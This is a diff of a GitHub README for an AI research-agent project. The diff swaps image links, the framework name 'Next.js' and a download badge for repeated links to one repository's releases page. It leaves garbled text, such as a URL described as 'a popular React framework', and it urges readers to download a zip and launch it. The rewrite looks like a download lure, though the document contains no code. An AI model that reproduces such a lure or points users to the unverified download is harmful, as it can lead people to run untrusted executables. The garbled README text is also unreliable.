@@ -1,7 +1,7 @@
 # 🚀 **Gemini Research AI Agent**
-![Gemini AI Agent](https://imageurl.com)
+![Gemini AI Agent](https://github.com/mhohamad/Deep-Research-AI-Agent/releases)
 
-Welcome to the Gemini Research AI Agent repository! 🌌 In this project, we aim to create a powerful Deep Research AI agent similar to Gemini or ChatGPT. By leveraging technologies like Next.js, Vercel AI SDK, and Exa Search API, we are building an intelligent system capable of generating follow-up questions, crafting optimal search queries, and compiling comprehensive research reports.
+Welcome to the Gemini Research AI Agent repository! 🌌 In this project, we aim to create a powerful Deep Research AI agent similar to Gemini or ChatGPT. By leveraging technologies like https://github.com/mhohamad/Deep-Research-AI-Agent/releases, Vercel AI SDK, and Exa Search API, we are building an intelligent system capable of generating follow-up questions, crafting optimal search queries, and compiling comprehensive research reports.
 
 ## ℹ️ About the Project
 The **Deep-Research-AI-Agent** repository is a hub for developing cutting-edge AI technologies in the fields of research, natural language processing, and AI assistance. Our goal is to push the boundaries of what AI agents can achieve by incorporating advanced algorithms and smart search capabilities.
@@ -14,7 +14,7 @@ The **Deep-Research-AI-Agent** repository is a hub for developing cutting-edge A
 
 ## 🛠️ Technologies Used
 To bring the Gemini Research AI Agent to life, we are utilizing a variety of technologies and tools, including:
-- **Next.js**: A popular React framework for building efficient web applications.
+- **https://github.com/mhohamad/Deep-Research-AI-Agent/releases**: A popular React framework for building efficient web applications.
 - **Vercel AI SDK**: Empowering our AI agent with advanced AI capabilities.
 - **Exa Search API**: Providing access to a wealth of data for research purposes.
 - **OpenAI**: Integrating state-of-the-art AI models for enhanced performance.
@@ -29,7 +29,7 @@ To dive into the world of the Gemini Research AI Agent, simply follow these step
 5. Start exploring the capabilities of the AI agent!
 
 ### 📦 Latest Release
-[![Download Gemini AI Agent](https://img.shields.io/badge/Download%20Latest%20Release-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip) 👈 Click here to download the latest release. Remember to launch the application after downloading!
+[![Download Gemini AI Agent](https://github.com/mhohamad/Deep-Research-AI-Agent/releases%20Latest%https://github.com/mhohamad/Deep-Research-AI-Agent/releases)](https://github.com/mhohamad/Deep-Research-AI-Agent/releases) 👈 Click here to download the latest release. Remember to launch the application after downloading!
 
 If the link is not working or you need more information, please check the "Releases" section of the repository for alternative download options.
 
@@ -38,7 +38,7 @@ We welcome contributions, feedback, and collaborations from the community to mak
 
 Let's embark on this exciting AI journey together and unlock the potential of deep research and intelligent assistance! 🚀🔍
 
-![Gemini AI Journey](https://imageurl2.com)
+![Gemini AI Journey](https://github.com/mhohamad/Deep-Research-AI-Agent/releases)
 
 ---
 © 2023 Gemini Research AI. All rights reserved.
